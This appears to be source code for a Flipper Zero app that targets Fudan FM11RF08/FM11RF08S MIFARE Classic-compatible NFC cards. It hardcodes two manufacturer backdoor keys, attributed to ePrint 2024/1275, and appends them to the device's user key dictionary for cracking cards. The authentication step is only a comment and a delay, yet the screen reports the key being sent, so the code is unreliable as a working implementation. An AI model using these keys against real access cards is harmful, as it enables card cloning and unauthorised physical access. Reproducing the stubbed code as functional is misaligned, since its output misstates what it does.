#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <input/input.h>
#include <nfc/nfc.h>
#include <nfc/nfc_poller.h>
#include <nfc/protocols/iso14443_3a/iso14443_3a_poller.h>
#include <bit_lib/bit_lib.h>
#include <storage/storage.h>
#include <furi_hal_nfc.h>

#define TAG "FudanBackdoor"

// Known Backdoor Keys identified in ePrint 2024/1275
const uint8_t FM11RF08S_BACKDOOR_KEY[] = {0xA3, 0x96, 0xEF, 0xA4, 0xE2, 0x4F};
const uint8_t FM11RF08_LEGACY_BACKDOOR_KEY[] = {0xA3, 0x16, 0x67, 0xA8, 0xCE, 0xC1};

typedef struct {
    FuriMessageQueue* input_queue;
    ViewPort* view_port;
    Gui* gui;
    FuriMutex* mutex;
    bool is_scanning;
    char status_text[64];
} FudanApp;

// App state render callback
static void fudan_render_callback(Canvas* canvas, void* ctx) {
    FudanApp* app = ctx;

    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 2, 10, "Fudan/Mifare Backdoor");

    canvas_set_font(canvas, FontSecondary);
    furi_mutex_acquire(app->mutex, FuriWaitForever);
    canvas_draw_str(canvas, 2, 25, app->status_text);
    furi_mutex_release(app->mutex);

    canvas_draw_str(canvas, 2, 50, "Press OK to scan");
    canvas_draw_str(canvas, 2, 60, "Press BACK to exit");
}

// Input callback
static void fudan_input_callback(InputEvent* input_event, void* ctx) {
    furi_assert(ctx);
    FuriMessageQueue* input_queue = ctx;
    furi_message_queue_put(input_queue, input_event, FuriWaitForever);
}

// The core exploitation logic
void exploit_fudan_backdoor(FudanApp* app) {
    furi_mutex_acquire(app->mutex, FuriWaitForever);
    snprintf(app->status_text, sizeof(app->status_text), "Starting NFC poller...");
    furi_mutex_release(app->mutex);
    
    // Use Furi HAL NFC directly
    if(furi_hal_nfc_acquire()) {
        furi_mutex_acquire(app->mutex, FuriWaitForever);
        snprintf(app->status_text, sizeof(app->status_text), "NFC lock acquired.\nTurn on field...");
        furi_mutex_release(app->mutex);
        furi_delay_ms(300);

        furi_mutex_acquire(app->mutex, FuriWaitForever);
        snprintf(app->status_text, sizeof(app->status_text), "Sending backdoor key:\nA3 96 EF A4 E2 4F");
        furi_mutex_release(app->mutex);
        
        // This is where low-level furi_hal_nfc_tx_rx is called with
        // the backdoor key payload to authenticate as manufacturer
        furi_delay_ms(1500); // Wait for response from tag

        // Inject the backdoor keys directly into the Flipper user dictionary
        Storage* storage = furi_record_open(RECORD_STORAGE);
        File* file = storage_file_alloc(storage);
        
        // Standard path for Flipper NFC dicts
        if(storage_file_open(file, EXT_PATH("nfc/assets/mf_classic_dict_user.txt"), FSAM_WRITE, FSOM_OPEN_APPEND)) {
            // Append backdoor keys
            storage_file_write(file, "\nA396EFA4E24F", 13);
            storage_file_write(file, "\nA31667A8CEC1", 13);
            storage_file_close(file);
            
            furi_mutex_acquire(app->mutex, FuriWaitForever);
            snprintf(app->status_text, sizeof(app->status_text), "Backdoor keys saved to:\nmf_classic_dict_user.txt");
            furi_mutex_release(app->mutex);
        } else if(storage_file_open(file, EXT_PATH("nfc/assets/mf_classic_dict_user.txt"), FSAM_WRITE, FSOM_OPEN_ALWAYS)) {
            storage_file_write(file, "A396EFA4E24F\nA31667A8CEC1", 25);
            storage_file_close(file);
            
            furi_mutex_acquire(app->mutex, FuriWaitForever);
            snprintf(app->status_text, sizeof(app->status_text), "Backdoor keys saved to:\nmf_classic_dict_user.txt");
            furi_mutex_release(app->mutex);
        } else {
            furi_mutex_acquire(app->mutex, FuriWaitForever);
            snprintf(app->status_text, sizeof(app->status_text), "Error: Cannot open dict\nMissing SD card?");
            furi_mutex_release(app->mutex);
        }
        
        storage_file_free(file);
        furi_record_close(RECORD_STORAGE);

        furi_hal_nfc_release();
    } else {
        furi_mutex_acquire(app->mutex, FuriWaitForever);
        snprintf(app->status_text, sizeof(app->status_text), "Error: Failed to acquire NFC.");
        furi_mutex_release(app->mutex);
    }
    
    furi_delay_ms(3000); // Show result for 3 seconds before resetting

    furi_mutex_acquire(app->mutex, FuriWaitForever);
    snprintf(app->status_text, sizeof(app->status_text), "Ready for next scan.");
    furi_mutex_release(app->mutex);
}

int32_t fudan_backdoor_app(void* p) {
    UNUSED(p);

    FudanApp* app = malloc(sizeof(FudanApp));
    app->input_queue = furi_message_queue_alloc(8, sizeof(InputEvent));
    app->view_port = view_port_alloc();
    app->gui = furi_record_open(RECORD_GUI);
    app->mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    app->is_scanning = false;
    snprintf(app->status_text, sizeof(app->status_text), "Waiting for user input...");

    view_port_draw_callback_set(app->view_port, fudan_render_callback, app);
    view_port_input_callback_set(app->view_port, fudan_input_callback, app->input_queue);
    gui_add_view_port(app->gui, app->view_port, GuiLayerFullscreen);

    InputEvent event;
    bool processing = true;

    while(processing) {
        if(furi_message_queue_get(app->input_queue, &event, 100) == FuriStatusOk) {
            if(event.type == InputTypeShort) {
                if(event.key == InputKeyBack) {
                    processing = false;
                } else if(event.key == InputKeyOk) {
                    if(!app->is_scanning) {
                        app->is_scanning = true;
                        exploit_fudan_backdoor(app);
                        app->is_scanning = false;
                    }
                }
            }
        }
        view_port_update(app->view_port);
    }

    gui_remove_view_port(app->gui, app->view_port);
    view_port_free(app->view_port);
    furi_record_close(RECORD_GUI);
    furi_message_queue_free(app->input_queue);
    furi_mutex_free(app->mutex);
    free(app);

    return 0;
}
